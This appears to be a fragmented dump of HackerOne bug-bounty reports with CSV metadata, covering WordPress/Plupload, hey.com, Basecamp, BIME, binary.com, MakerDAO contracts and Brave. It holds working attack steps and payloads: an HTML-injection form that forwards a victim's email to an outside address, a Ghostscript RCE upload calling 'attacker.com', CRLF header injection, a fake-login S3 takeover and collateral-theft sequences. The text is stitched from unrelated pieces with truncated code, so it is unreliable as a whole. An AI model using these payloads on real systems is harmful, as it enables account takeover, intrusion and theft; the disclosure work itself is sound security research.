5        //_fireEvent(""Exception"", { name: 'RuntimeError', message: 4 });
6        
7        // throwing an exception would be better here
8    }
9}
The method is being called from within the _init() method and receives an event and an optional object. The actual event dispatcher is stored as an object member at a different place in the code.
Calling _fireEvent:
Code 92 BytesWrap lines Copy Download1Moxie.uid = Utils.sanitize(params[""uid""]);    
2
3[...]
4
5_fireEvent(Moxie.uid + ""::Init"");    
Setting the event dispatcher:
Code 138 BytesWrap lines Copy Download1// Event dispatcher
2if (params.hasOwnProperty(""target"") && /^[\w\.]+$/.test(params[""target""])) {
3    eventDispatcher = params[""target""];
4}
The sanitation for both the event dispatcher and the event string is quite tough and only allows word characters in one case, and word characters and the dot in the other case:
Code 77 BytesWrap lines Copy Download1if (params.hasOwnProperty(""target"") && /^[\w\.]+$/.test(params[""target""])) {
2
Code 175 BytesWrap lines Copy Download1static public function sanitize(str:String) : String
2{
3    // allow only [a-zA-Z0-9_]
4    return str.replace(/[^\w]/g, '');
5}
6[...]
7Moxie.uid = Utils.sanitize(params[""uid""]);
8
Despite the strong validation, the attacker can still cause damage - tremendous damage too. This is done by executing a SOME attack. This kind of attack allows to generate certain types of events by abusing the callback.
An attacker can for example click a button on the same domain as the Flash file by instructing the Flash file, not to execute a pre-defined callback but rather by making use of certain DOM properties that give more or less direct access to the button and then by executing a click() method. Let’s have a look at a trivial example first and imagine victim.com that hosts both the Plupload SWF and some logic, where a click on a button will, let’s say, delete a user:

Attacker crafts a specific payload
Attacker then lures logged in victim to a website 
The website will do the following steps 
Open the Plupload SWF in a new tab
Have the SWF use the target parameter opener.document.body.firstElementChild.firstElementChild.click
While the SWF still loads, the opener location changes
It navigates to victim.com/admin
Now, SWF and page are on the same domain
SWF is now allows to perform clicks on opener. The button will be clicked

Done, that is the whole attack in simple. Open SWF in a new window, define a callback that traverses to an important element and clicks it, navigate the opener to the page containing the element, have the click happen.
Now, the following more specific PoC describes the attack against WordPress and shows, how we can turn the SOME into an RCE!

An attacker sends a link that contains the exploit to an authenticated user
The user (victim) opens the link and clicks the button
The exploit opens a new window to the SWF file, meanwhile the other window is loading the plugin page
The exploit then triggers the install button of a malicious plugin
The plugin is installed and the malicious codes are uploaded on the server accordingly

Affected Systems
All WordPress instances that allow to directly call this file. That should be the absolute majority. Google finds a couple of them but we assume it is actually significantly more⁹.
Here is some numbers that other people guesstimate:

https://managewp.com/14-surprising-statistics-about-wordpress-usage
https://www.quora.com/How-many-websites-are-built-on-Wordpress
https://wordpress.com/activity/

Further note, browser-based XSS filters will not detect the attack and hence not protect here.
Mitigation

Prevent direct access to all Flash files in the WordPress folder (Content-Disposition headers might help)
Configure your WAF to block direct access to this file
Wait for the fix and update Wordpress

Automattic,1001-5000,0.0,50m-100m,$300.00,High,7.95,Violation of Secure Design Principles,Email Verification bypass on signup,"haqsek2  submitted a report to Automattic.Nov 21st (2 years ago)Summary:
This bug is related to wordpress.com. There is feature in wordpress.com which allow users to invite people. We have to enter email address to invite that particular person but the invite link and invite key is also available to the person who invited. This allow attackers to create the profile without having access to the email address and they can make account on behalf of any people who  is not already signed up in wordpress.com
Platform(s) Affected:
wordpress.com
public-api.wordpress.com
Steps To Reproduce:
This issue can be reproduced by following these easy steps: 

Login to your account on wordpress.com
Setup burpsuite proxy with browser.
Select your site and navigate to manage>people
Enter any email address which is not already registered in wordpress.com and invite
Open this url in browser: https://wordpress.com/people/invites/yoursite.wordpress.com   [change yoursite.wordpress.com with your site]
See the burp suite proxy tab and find the GET request to this endpoint [https://public-api.wordpress.com/rest/v1.1/sites/siteId_here/invites?http_envelope=1&status=all&number=100][there will be a number instead of siteId_here]
In response of this GET request you will see JSON which will be consisting of the details about the invitations sent and there you will find ""invite_key"" and ""link"".
Copy the link and open this in another browser.
You can create account on behalf of this email without having access to the email and email verification is bypassed :)

See the attached video for POC
Mitigation:
This is the pure violation of secure design principles, this can be mitigated by just removing the [invite_key] and [link] from the response in [https://public-api.wordpress.com/rest/v1.1/sites/siteId_here/invites?http_envelope=1&status=all&number=100]. Because this invite key and link is the property of the person being invited, showing these creds to other people will result this type of issue.
Impact
This issue can be used to bypass email verification on signup. Attackers can create account on behalf on any person without having access to the email account.

Basecamp,11-50,0.0,10m-50m,"$1,000.00",High,7.95,Denial of Service,a very long name in hey.com can prevent anyone from accessing their contacts and probably can cause denial of service,"tw4v3sx  submitted a report to Basecamp.Oct 24th (2 years ago)Summary :
after trying to change my initial name to something long i found out that their are no limits to how long it can be , so i directly changed it to something very long name.txt (F1050497) which caused my account to really slow down when accessing it and in the android app , it just keeps crashing whenever i open it ( no way to access my account at all ) + if i make it longer i get a 500 Internal Server Error response which highly suggests that this can cause a server side denial of service .
Description:
due to not checking the length of the name one can change it to a very long one causing both a server side denial of service  and a client side one
server side :
one can send multiple requests to change the name of the account and each of them containing a very long name which will cause a 500 internal server error leading to an extensive Resource Consumption.
client side :

if one is able to change the name another account he will also have the ability to crash his android app therefore preventing him from accessing his account.
if one with a long name sends a message to any email he will slowwwwww down everything where the message appears including folders (inbox , trash ..) and prevent him from accessing his contacts where the email's name also appears , because the app will hang on a loading screen for about 40min each time , and this can be more if for example he sends multiple messages or use multiple accounts ( each on with a long name ) to send a message to the victim mail.

Proof of Concept:

open https://app.hey.com/contacts/%user_id_number%/user/editand change the name to the one attached name.txt (F1050497) and submit.
now u can't open the android app and u can slow down anyone's account just by sending them a message (or multiple ones).

Impact

Attacker can perform a DoS Attack against the server
slow down anyone's account
crash the android app

PoC:
1- you will need to register on the 37Signals Integration Portal.
2- Login to any 37Signals apps that uses the OAuth2 authorization for example basecamp 3 account. (i tested it using basecamp 3 )
3- for testing , submit the following form through the browser in which you are logged in:
Code 485 BytesWrap lines Copy Download1<form action=""https://launchpad.37signals.com/authorization.json"" method=""POST"">
2      <input type=""hidden"" name=""client&#95;id"" value=""{your-client-id}"" />

How can we exploit this?
First, let's go ahead and create an account over at helpscout.  It can be
anything.  Let's setup an inbox.  Again, it can be anything, doesn't really
matter.  What does matter is that we setup a custom address for the inbox.
Of course, helpscout makes sure we have access to the email address we're
acting as.  
So let's go ahead and setup an email as dhhracing@hey.com.  First, we sign up
for a trial on hey.com with that email.  All good.  Now, let's enter that into
helpscout.  Once we get the verification email in hey, we enter the verification
in helpscout.  But... generally there is another step.  Helpscout needs to have
permission to send on our behalf.  How do they do that?  With DNS records for
SPF, DKIM and DMARC.  But... hey.com has already done that as they themselves
are helpscout customers.
Now here is where the trouble comes in.  hey.com has a recycle policy.  If you
create a trial but never pay, or as for a refund, then after 30 days the email
address becomes available again.  So let's go ahead and cancel our
dhhracing@hey.com account (in hey, not in sendgrid).  Now we wait 30 days.  Now,
DHH realizes he needs an address for his racing.  So he goes to hey.com and
creates an account under dhhracing@hey.com.  And what do you know, it's
available!
But now, not only can DHH send email from dhhracing@hey.com, but SO CAN I.  From
my helpscout account.  Of course, I won't receive mail from that account, but I
could always just send out mail and CC another address that I own and hope for a
reply-all.  But really, the options for scamming are limitless.
I've suggested a few options to hey.com:

Don't use the primary domain on helpscout.  Setup heysupport.com or
something similar.
Don't ever recycle accounts.  I can only ever see this causing issues.
Get helpscout to treat hey.com as a mail provider and don't allow sending
from their domain.

Impact
An attacker could spoof any hey.com email address that they had originally created an address for (and had been recycled).  This could allow them to appear to be a high-profile individual or company.  By CCing an address that they currently own they could receive replies from the correspondence as well.",https://hackerone.com/reports/981824,Illinois,United States,Chicago,2020,9,14,16,41
Basecamp,11-50,0.0,10m-50m,$100.00,Low,2.0,Violation of Secure Design Principles,Error Page Content Spoofing or Text Injection ,"princej_76  submitted a report to Basecamp.Jun 26th (about 1 year ago)Target:  https://gopher.hey.com/
Description:  Content spoofing, also referred to as content injection, ""arbitrary text injection"" or virtual defacement, is an attack targeting a user made possible by an injection vulnerability in a web application. When an application does not properly handle user-supplied data, an attacker can supply content to a web application, typically via a parameter value, that is reflected back to the user. This presents the user with a modified page under the context of the trusted domain.
Steps to Reproduce:

Go to https://gopher.hey.com/
Type any thing after slash, it will be reflected on the page.

Reference: https://hackerone.com/reports/498562

Impact
This attack is typically used as, or in conjunction with, social engineering because the attack is exploiting a code-based vulnerability and a user's trust. As a side note, this attack is widely misunderstood as a kind of bug that brings no impact.2 attachments:F1354152: Screenshot_from_2021-06-26_16-56-41.pngF1354154: Screenshot_from_2021-06-26_16-56-07.png",https://hackerone.com/reports/1245051,Illinois,United States,Chicago,2021,6,26,11,38

To reproduce the bug you have to send raw HTML-formatted email. You can do it e.g. with the Sendmail tool on Linux.
Example email:
Code 547 BytesWrap lines Copy Download1From: jouko@klikki.fi

To send the email, create a text file with the above contents. Send it with the command
Code 33 BytesWrap lines Copy Download1/usr/sbin/sendmail -t < email.txt
The backslashes in the <style> tag are decoded. The first \000027 confuses the HTML filter. The encoded <message-content> and <template> tags are there to escape the DOM shadowroot element. The HTML filter doesn't let you inject only closing tags, i.e. </template>, you need an opening tag first.
Finally, HTML like this is injected:
Code 185 BytesWrap lines Copy Download1<form action=""/my/accounts/266986/forwardings/outbound"" data-controller=""beacon"">
2<input type=text name=""contact_outbound_forwarding[to_email_address]"" value=""joukop@gmail.com"">
3</form>
This exploits the Stimulus framework and the existing JavaScript controllers to post the form automatically. The CSRF token is inserted by the framework. This example sets up email forwarding to an external address.
This is just one way to exploit the bug. Even though plain <script> won't work in modern browsers due to the Content Security Policy, It seems likely there are ways to bypass it by using the JS frameworks (will look at this more). The account ID in this PoC has to be guesstimated or brute forced (266986).
Another example is to simply set the form action to an attacker URL. This will send the user's CSRF token to the attacker so that it could be used in a subsequent attack.

During redirect probe, It also appears that front-end infrastructure performs caching of content. Using HTTP request smuggling attack, It is possible to poison the cache with the off-site redirect response using X-Forwarded-Host request header in smuggled request. This will make the attack persistent, affecting any user who subsequently requests the affected URL.

Basecamp,11-50,0.0,10m-50m,"$5,000.00",High,7.95,Command Injection - Generic,Insecure Bundler configuration fetching internal Gems (okra) from Rubygems.org,"zofrex  submitted a report to Basecamp.Feb 16th (2 years ago)I believe (most likely) that one of your projects is not set up correctly to only pull internal gems from your internal gem server, and instead will pull gems from Rubygems.org if the version number there is higher.
Specifically, the ""okra"" gem.
At around 15:21 today (UTC) the okra gem that I wrote – https://rubygems.org/gems/okra – was installed on the machine with hostname ""oscillatinghost"" under the username ""fernando"" on your network.
This would be possible if the Gemfile either installs gems from global sources (thus allowing the version on Rubygems to 'trump' the internal version) or if the okra gem is depended on by another internal gem, and your version of Bundler is less than 2.2.10 – see here for details on that: https://bundler.io/blog/2021/02/15/a-more-secure-bundler-we-fixed-our-source-priorities.html
It is possible this is not correct, and instead, someone typed ""gem install okra"" without specifying where to fetch the Gem from. This would potentially also have fetched it from Rubygems.
Please note that the Gem I wrote does not do anything malicious, and only fetches the minimum information I need to filter out false positives and correctly identify organisations. You can verify this yourself by looking at the code for the gem ""okra-90002.0"" in your gems folder. I will delete all information relating to your organisation as soon as it is no longer needed.
Impact
The impact is that an attacker could achieve arbitrary Remote Code Execution on any machines that will fetch the gem from the Rubygems repository.
Note that to achieve code execution, merely installing the Gem is enough, it does not have to be require'd or run.Summary by zofrexI found an internal gem (Ruby library) in use by Basecamp that was not registered on Rubygems (the public Ruby package repository). I registered a gem of my own under the name that would call back when installed, in an attempted ""dependency confusion"" attack.
Although this attack was not successful against any production machines or automated builds, as Basecamp had successfully mitigated against the attack in those places, my library was installed on a developer machine when a member of Basecamp attempted to install the gem by hand using ""gem install"" rather than running a ""bundle install"".
This vulnerability was resolved by using configuration management software to set the default package repository on developer machines to one controlled by Basecamp, where they can control which packages come from which repositories and can prevent internal packages being pulled from Rubygems.",https://hackerone.com/reports/1104874,Illinois,United States,Chicago,2021,2,16,17,13

Hello Team,
While testing it was observed that on https://app.hey.com/, on Search box there is a possibility of XSS. Although the payload is reflected in the DOM but the CSP blocks the execution of the script, the XSS can happen if the CSP is somehow bypassed. The Subject parameter is vulnerable.
Apart from XSS, the HTML injection attack is working pretty straight forward.
Steps To Reproduce:

Go to https://app.hey.com
Login to your account.
Click on 'Write' Mail button.
Add the recipient as yourself.
In the Subject, add following payload

Code 76 BytesWrap lines Copy Download1TestPayload&lt;/a&gt;&lt;a href=""javascript:alert(1)""&gt;ClickHere&lt;/a&gt;

Send the mail.
Go to top left corner Search Box and type ""TestPayload"" 
You will see the mail you sent to yourself, and <a> tag will be there ""ClickHere"".
Click on it, you will see the CSP violation in the Console.
Below is the CSP of the page:

Code 368 BytesWrap lines Copy Download1script-src 'self' https://production.haystack-assets.com stats.hey.com *.braintreegateway.com *.braintree-api.com hcaptcha.com *.hcaptcha.com;

As seen from the CSP, there might be a possibility of Host whitelists bypass.
Impact
If attacker send such type of mail to a victim and if victim accidentally searches for the same mail then the Script will be executed leading to account takeover. This is possible only if CSP is bypassed.",https://hackerone.com/reports/1010132,Illinois,United States,Chicago,2020,10,16,13,57

The host pattern is /(launchpad\.37signals\.com|launchpad\.(?:dev|test))/ and /(3\.(?:staging\.)?basecamp\.com|bc3\.(?:dev|test))/. By controlling the subdomain, and setting it to something like launchpad.dev.mydomain.com, we can bypass this regular expression verification.
Since we'll be sending the request to our own server, we simply need to return text/calendar as the content-type header. This can be seen in the Electron code in OPENABLE_MIME_TYPES = new Set([""text/calendar""]);
And then when adding the URL to your post, simply add the ?attachment=true to the URL. 
To reproduce, simply register any subdomain that starts with launchpad.dev. (mine is launchpad.dev.████).
An HTTP server with the needed mimetype header, can be setup with Flask easily with this code:
Code 267 BytesWrap lines Copy Download1from flask import Flask, send_from_directory
2app = Flask(__name__)
3@app.route('/<path:path>')
4def hello(path):

6if __name__ == '__main__':
7    app.run(port=80,host=""0.0.0.0"")
Then add the link to your post with the appropriate attachment parameter, as such:
http://launchpad.dev.█████████/file.exe?attachment=true

Images are converted on the server side, but not only image files but also PostScript/EPS files are accepted (if renamed to .gif). This is probably due to ImageMagick / GraphicsMagick being used for image conversion, which calls a PostScript interpreter (Ghostscript) if the input file starts with '%!'. The used Ghostscript version however has a security bug (CVE-2017-8291) leading to remote command execution.
/Proof of concept/: Upload the attached rce.gif file as profile image (change the `ping -c1 attacker.com' to some other shell command).
/Mitigation/: Upgrade Ghostscript; also, before processing uploaded images make sure they are real image files (e.g. based on magic header)

On a dashboard, widgets can be added to show a graphic representation of a query. These queries come from datasources. When creating a widget, a query ID is given. This query ID can be changed in order to obtain the results of the dataset through a scheduled email. This leaks (sensitive) information of other customers their dataset.
Proof of concept
Sign in as a normal user - I used my personal email address on the https://h1-bugbounty.bime.io domain. After creating your first dashboard, a POST request is sent to the /widgets.json endpoint. It'll look something like this:

Notice the query_id in the request. Change this ID to the query object that you want to see the data of. Now go to the web application and click on Dashboards in the left column. It'll look something like this:

As you can see, there's an empty widget. This is caused by the fact that the user is not authorized to view the data. This is good. I tried exporting the data by clicking the Export button at the bottom. However, this does not leak the data, the images and PDFs I downloaded show up empty. This is also good. But when I scheduled an email reminder for every 5 minutes, and I waited 5 minutes, I received a PDF and image in my inbox that contained the actual data:

It seems that the authorization / authentication is implemented differently when executed asynchronous, which allows an attacker to obtain actual data from other customers' datasources and queries.

It points to an Amazon S3 bucket in the S3 US East 1 region. Visiting http://a2.bime.io revealed that the bucket did not exist (a 404 error was shown). Obviously this is not the case any longer, as the bucket is now claimed and serving a fake login page (see ""Attack Scenario"").
I created a bucket with name ""a2.bime.io"" on my S3 account in the US East 1 region.
I enabled static website hosting and pointed ""index.html"" as the index document.
Then I uploaded index.html (attached to this report) and clicked ""Make public"" to make sure it can be served. 
Now go to http://a2.bime.io and you will see a BIME login page. Click the Sign In button and you will notice it is a fake login form. 

Attack Scenario
I created a false login page and posted it on http://a2.bime.io. The login page looks just like the normal BIME sign in page, but it is 100% controlled by the attacker. The attacker could harvest logins by convincing their victims to visit the fake login page. Since it is a subdomain of bime.io, which BIME customers will recognize, it is likely they will fall for the attack. 
I have attached the fake login page here as index.html.
Remediation
Remove the a2.bime.io DNS entry so it no longer points to an S3 bucket Zendesk Ops doesn't control. If you need me to release a2.bime.io as an S3 bucket, let me know and I'll delete the bucket.1 attachment:F77313: index.htmlnoops43   posted a comment. Mar 8th (7 years ago)Hello @michiel,

I don't include words like ""urgent"" in my title very often, but I thought you might want to get onto this right away. An attacker can access the data source of any other customer on the BIME platform through the /cube_models.json endpoint. This leaks, for example, the login information of Postgres backends (including hostname, login, and passwords). I haven't verified whether the passwords are encrypted, but this seems pretty bad nevertheless.

We will get a response header that says:

However this value doesnt seem to be urlencoded which gives the attacker the option to create his own response header. For example if you were to visit:
https://www.binary.com/user/validate_link?step=account&verify_token=%0aSet-Cookie:%20GerbenJavado=Awesome;%0a
The following response header will be included in the response: (shameless plug)
    Set-Cookie: GerbenJavado=Awesome;
Attacker Scenario
Since this attack doesnt require any user interaction to be exploited, a attacker could do lots of fun stuff using this vulnerability by including a malicious url in a Iframe or even in a IMG tag. 

As the example shows the attacker can set cookies for the user on binary.com
The attacker can disable or bypass security headers placed by the server

One restricition the attacker has is that the request is a redirect. This made it for me impossible to XSS attacks or Cache Poisining. Maybe you guys could look a bit into this further. However i would argue that because of the fact user interaction is not needed and the fact that the attacker can set his own headers (including cookies) the attack is fairly scary.",https://hackerone.com/reports/95981,Selangor,Malaysia,Shah Alam,2015,10,26,23,48

open 2 browsers and create 2 accounts , login with each account on a browser.


let's call account 1 , the victim and account 2 is the attacker.


from the victim account , make sure you are using real account and then go to https://www.binary.com/cashier then click Deposit then click Continue. 


From the attacker account go to https://www.binary.com/cashier then click Deposit then click Continue. 


Now you'll see your cashier account , inspect the page elements using your browser inspector then find the <iframe> tag with the id attribute cashiercont. it will look like this :

BlockDev Sp. Z o.o,1001-5000,0.0,200m-1b,"$50,000.00",Critical,9.5,Improper Input Validation,Steal ALL collateral during liquidation by exploiting lack of validation in `flip.kick`,"lucash-dev  submitted a report to BlockDev Sp. Z o.o.Aug 29th (3 years ago)Summary:
The flip contract allows for the MCD system to auction collateral in exchange for DAI.
A lack of validation in the method flip.kick allows an attacker to create an auction with a fake
bid value. Since the end contract trusts that value, it can be exploited to issue any amount of free
DAI during liquidation. That DAI can then be immediately used to obtain all collateral stored in the
end contract.
Detailed Description:
The flipper contract (flip.sol) is intended to offer a way for the MCD contracts to obtain DAI by auctioning gems. An auction is initiated by calling the flip.kick method, which is normally done by the cat contract when it grabs collateral from a CDP.
The implementation of that method, however, completely lacks access control and has very little validation -- in particular, it's possible to execute the method even during the liquidation phase.
On top of that, all values stored in the auction are accepted as parameters of the method, including the bid amount. By directly calling the method, a malicious user can create a ""fake"" auction, with an arbitrary initial bid value, without spending the corresponding DAI.
Though that technique could be used to cause other damage, I will focus this report on the maximum-impact effect by exploiting it during the liquidation phase, in an attack vector that leads to transferring all collateral to the attacker.
First, the system must be in the liquidation phase, after end.flow is called to fix the exchange rate for redeeming collateral. Then the attacker performs three actions as follows:


Create a ""fake"" auction, by calling flip.kick. The bid parameter of the method can be set to any arbitrarily large value, in special a value at least equal to the total supply of DAI. The lot parameter, on the other hand, can be arbitrarily small, as long as it's not zero.


The attacker calls end.skip. The end contract will try to return the bid amount to the attacker. This will result in the issuance -- for free -- of DAI to the attacker, in any amount entered during step 1.


The attacker calls end.pack and end.cash thus converting the DAI into collateral. If the amount entered in step 1 is the total supply of DAI, the attacker will obtain ALL collateral stored in the end contract.


Steps To Reproduce:
I've attached to this report a modified version of end.t.sol which contains a test (test_steal_all_collateral_using_flipper) that reproduces the attack.
Please don't hesitate to contact me if you need help understanding the test or reproducing the issue.
Impact
The issue described in this report allows an attacker to steal ALL collateral stored in the MCD system during the liquidation phase -- possibly within a single transaction. This would result in a complete loss of funds for all users.
The cost of performing the attack is almost zero -- just the minimal denomination of each type of gem stolen plus gas.
Given the above I understand the issue has Critical severity, and fully qualifies for the corresponding bounty.1 attachment:F569307: end-flip-exploit.t.sollasse_y44rf   posted a comment. Aug 29th (3 years ago)Thanks, lucash-dev!

BlockDev Sp. Z o.o,1001-5000,0.0,200m-1b,"$5,000.00",High,7.95,Improper Input Validation,Steal all MKR from `flap` during liquidation by exploiting lack of validation in `flap.kick`,"lucash-dev  submitted a report to BlockDev Sp. Z o.o.Aug 29th (3 years ago)Summary:
The flap contract provides the ability to auction DAI for MKR. That's a fundamental functionality of the MCD system, invoked usually from the vow contract.
A flaw in the validation of calls to flap.kick, however, allows a malicious user to create ""fake' auctions that can be later used to steal MKR from flap during the liquidation (end) phase.
Detailed description
The method flap.kick, used to start an auction of DAI (for MKR) in the flap contract, lacks any validation of the bid parameter. Since the method is public, a malicious user can directly invoke it, passing an arbitrary bid parameter -- affecting other contracts that assume this value represents the highest bid in the auction.
While it's possible that this issue will cause other problems, in this report I'll focus on what seems to be the highest severity attack enabled by it.
The attack consists of two parts:
1 - During the normal operation of the MCD system (contracts not ""caged""), the attacker will create one or more ""fake"" auctions by calling flap.kick. The bid parameter can be arbitrarily large, and won't be validated in any way. On the other hand, the lot parameter can be arbitrarily small, as long as it's not zero, which means the auction can be placed with almost zero cost.
2 - After governance calls end.cage, the auctions are stopped -- but any MKR deposited in the flap contract for any outstanding auction will still be there until someone calls yank for each one.
At this point, the attacker can call flap.yank for his own ""fake"" auctions, and that will result in him getting MKR transferred from the flap contract to himself -- in whatever amount was specified as bid in step 1.
Since the attacker might no know beforehand, it would be wise for them to create multiple ""fake"" auctions. In particular, an exponential series of auctions, with bid values 1, 2, 4, 8, 16... will allow the attacker to extract any exact amount of MKR from the flap contract.
Steps To Reproduce:
I've attached to this report a modified version of end.t.sol which contains a test (the last one, test_steal_mkr_from_flapper) that reproduces this attack.
Please don't hesitate to contact me if you have any trouble understanding or reproducing this issue.
Impact
This issue allows an attacker to steal arbitrary amounts of MKR deposited for auction.
That impact is particularly troubling, as MKR tokens are used to govern the platform, and anyone maliciously obtaining large quantities of these tokens might use them to further affect other core functionalities, potentially leading to stealing collateral, DAI etc. Also, because the same MKR token might be used for governance of future versions of the contracts, the damage might be much more enduring and harder to mitigate.
Given the above, and the minimal cost for perpetrating the attack, this issue would normally be classified as Critical. The specific policies for this program, though, won't allow for that, since this attack doesn't steal collateral directly. So, I classified the severity as High.1 attachment:F569418: steal-mkr-flap.t.sollasse_y44rf   posted a comment. Aug 29th (3 years ago)Thanks, lucash-dev!

The end contract in MCD controls the process of shutting down
the MCD contracts and allowing for users to redeem their DAI for
collateral -- presumably to migrate to a new implementation of DAI.
The process, however, doesn't prevent the continued functioniong
of DAI savings accounts (pot contract), which allows for continued
minting of DAI after all other contracts have been ""caged"", resulting
in theft (possibly involuntary) of collateral.
Detailed Description
The end contract is responsible for orchestrating the complex sequence
of steps for shutting down the MCD eco-system, settling all existing DAI
into collateral during the process.
The first step in the process is the method cage, which ensures that other
MCD contracts stop operating in the normal way, and enter a ""not-live"" mode.
In particular, the vat contract is updated to prevent the creation of new
CDP's, and also prevents the accrual of interest (vat.fold). This is obtained by
calling the cage method in the vat contract.
Puzzingly, however, the end.cage method doesn't affect the state of the pot
(savings account) contract, allowing for interests to be continuously earned
-- and new DAI to be minted --indefinitely during all the phases of the end
process. Most significantly, it allows a user to mint new DAI even after the
final DAI/collateral rate has been fixed (end.flow).
The consequence is that it's possible to inflate the DAI supply so that there
isn't enough collateral for all of it to be redeemed. In that case the last
users to try to redeem will have their collateral stolen by the faster ones, as
they might well be unable to redeem any DAI at all.
An example might help clarify the problem:


Suppose there are two users, Ali and Bob, who each control 50% percent of the
DAI supply, lets say 10 DAI each.


Now let's assume the end process is initiated and proceeds as usual --
eventually reaching the flow stage, with a fixed exchange rate of 1 DAI / ETH.


Let's also assume that there is a DSR rate of 100% a month (unrealistic, but makes
the numbers easier).


After the end.flow is called, Ali notices that the he can still use pot to earn
interests, so he deposits all his DAI in pot. Meanwhile Bob can't do the same
as his funds are locked inside a Dapp (let's say an Augur market).


After one month, Ali calls pot.exit and gets back 20 DAI. That corresponds to
the total original supply of DAI before end.flow was called. So, Ali calls
end.pack and end.cash to convert his 20 DAI into 20 ETH -- all the collateral
in the MCD contracts.


When Bob tries to redeem his DAI, there is no collateral left. His end.cash
calls fail and he ends up with no tokens -- DAI or ETH -- at all.


Steps to Reproduce
I've attached to this report a version of end.t.sol that adds a test scenario
(test_steal_collateral_using_dsr_after_thaw) to reproduce this attack (in fact, the example above).
Please don't hesitate to contact me if you need more help reproducing it.
Possible Remediation
The issue could be completely prevented by introducing a cage functionality into
the pot contract, and not allowing the pot.drip method to be called when
not in live mode.
Please note that the above solution is provided as proof that the reported issue
is fixable. I make no claim that the above is the best available solution.

Final Note

this issue, or help reproducing and evaluating it.
Impact
Impact Analysis
As clearly demonstrated above, the reported bug can be used to steal collateral
from the end contract. Even more disturbingly, the bug can likely cause users
that own DSR deposits to unwittingly steal collateral in case of a shutdown.
Let's evaluate how much collateral can be stolen in this scenarios. The amount
stolen depends on three factors:
1 - DSR savings rate.
2 - Portion of DAI kept in DSR deposits.
3 - Time distribution of users calling end.pack.
It's impossible to know beforehand either. But we can make educated guesses
about a worst-case scenario.
It's possible that the DSR rate will be set at a high value at some point.
Considering that the previous incarnation of DAI saw a the CDP rate reach
25% at some point, it's definitely possible for DSR to reach a slightly lower
rate, say 20%. Furthermore, it's likely all users (including Dapps) will keep
their DAI holdings in DSR deposits, doing so has a possible upside, and minimal
gas costs.
As for the time-distribution of users redeeming their DAI, it's again entirely
possible that a large portion of the DAI supply will be used to interact with
Dapps rather than held speculatively. Augur V2, for example, has plans to use
DAI for making bets on prediction markets. Since these markets might take
quite a long time to be resolved -- up to several months -- it's unlikely
that a DAI shutdown would cause an immediate withdrawal of DAI by Augur users
-- if the reported vulnerability isn't known.
Other Dapps might well have similar characteristics, though it's again impossible
to know beforehand.
Given the above -- DSR rates up to 20% and most of DAI locked in DSR deposits
inside Dapps for months -- it's perfectly possible that the bug leads to
a loss of 10% or more of the collateral in the MCD contracts.
That scenario might happen even without an intentional attack.1 attachment:F554819: end.t.sol",https://hackerone.com/reports/672664,Masovian Voivodeship,Poland,Warsaw,2019,8,13,21,21

Brave Software,101-250,0.0,10m-50m,$200.00,No value,0.0,Violation of Secure Design Principles,[iOS/Android] Address Bar Spoofing Vulnerability ,"aaditya_purani  submitted a report to Brave Software.Oct 15th (6 years ago)Hello,
I am Aaditya Purani, I would like to Report Address Bar spoofing vulnerability in Brave Browser on the IOS as well as Android Platform. All the Test have been carried out against Latest Brave Browser whose versions i have mentioned in Products affected section.
Summary:
Brave Browser Suffers from Address Bar Spoofing Vulnerability. Address Bar spoofing is a critical vulnerability in which any attacker can spoof the address bar to a legit looking website but the content of the web-page remains different from the Address-Bar display of the site. In Simple words, the victim sees a familiar looking URL but the content is not from the same URL but the attacker controlled content. Some companies say ""We recognize that the address bar is the only reliable security indicator in modern browsers"" . 
Products affected:

In IOS - Affected is the Latest Version 1.2.16 (16.09.30.10)
In Android - Affected in Brave Latest version 1.9.56 

Steps To Reproduce
I created a HTML Code which would spoof address bar of Brave Browser ( bravespoof.html) in the Attachments. As we can understand, the code contains a form which i have created just to demonstrate a look-a-like impact where it asks for username and password of any user. But the real trick is done, by the function f() whose location is equal to https://facebook.com . Additionally, to complete the exploit i used setInterval function to execute the function f continuously after every 10 milliseconds. Hence, ideally after 10 ms the Location would divert the URL as well as the page to display https://facebook.com content or it some cases, it keeps hold the of URL without changing the URL nor the page (which is again a safe case) . But in Brave Browser both fails, In brave when you host the below given HTML code to a web server and visit from either Android or IOS Brave Browser, The URL would get spoofed to https://facebook.com (Even it shows Green lock so victim would believe) but the content remains the one which attackers have placed.
Look at the Screenshot addressbarbrave.jpg POC where i showed how in Android Brave Browser the URL changed to https://facebook.com but the Content remains attacker controlled (i.e fakebook login page) . Moreover, the image of the bubble shows facebook logo (any victim would believe it )
Another screenshot i attached is braveiospoofing.jpg which is the POC of affected IOS Brave browser as we can see it shows https://facebook.com with green lock but the body of page is attacker controlled
I carried out same test in Chrome Browser too, But chrome is smart; It doesn't changes the url to https://facebook.com but the URL remain same of the URL of Hosted HTML ( I showed the same in chromeaddress.jpg screenshot). The same happens in Mozilla , it is also not affected. But the best one is UC Mini (on android) where it redirects to complete https://facebook.com to mitigate this fully. Even Safari Mobile (IOS) is also not affected. I tested the same on many browsers and Brave turned out to be affected.
I sincerely hope this gets Patched ASAP . Cheers !4 attachments:F128077: bravespoof.htmlF128078: chromeaddress.jpgF128080: addressbarbrave.jpgF128081: braveiospoofing.jpg",https://hackerone.com/reports/175958,California,United States,San Francisco,2016,10,15,8,17

Muon API allows executing code on the device. (e.g. with chrome.remote.require('child_process').exec)

In addition, Brave isn't sandboxed (on all OS).

That's clearly a vulnerability, not a feature:

Open PoC and click on button.
Popup should appear loading facebook and then should direct to a dummy page
Attempt to drag and drop the newly opened windows tab into the big 'O' under the button. (as if you are trying to move the tab but instead you drop it into the O)
We can successfully read 'x-brave-tab' object including history.

As I mentioned before, so much information is available in the output, specifically I want to point to the history section, where we can extract victims facebook name by reading URL after redirect.
This is done by opening a popup pointing to 'https://www.facebook.com/me' which will instantly redirect to 'https://www.facebook.com/{your name}' and then we redirect into a dummy page in order to create a history object.
Given that the user is not dragging directly from facebook.com then it is not the same as having a user copy paste or drag n drop their facebook URL. This is pretty much completely done within attacker controlled website.

Also, I wonder if something worse could happen messing with this object. I haven't been able to produce my own custom tabs yet, but if that is even theoretically possible then we 'theoretically' also have control of all the variables mentioned in the tab object.

A vulnerability in the Brave Browser allows an attacker to view the last time a Tor session was used in incognito mode. A local, on-disk attacker could read the Brave Browser's ""Local State"" json file and identify the last time a Tor session was used, affecting the confidentiality of a user's Tor session.
For example, the ""Local State"" file of a user who has recently used a Tor session would list a key value pair with a timestamp as accurate as ""13248493693576042"". This allows an attacker to fingerprint, or prove beyond reasonable doubt, that a user was using Tor at that very specific moment in time.

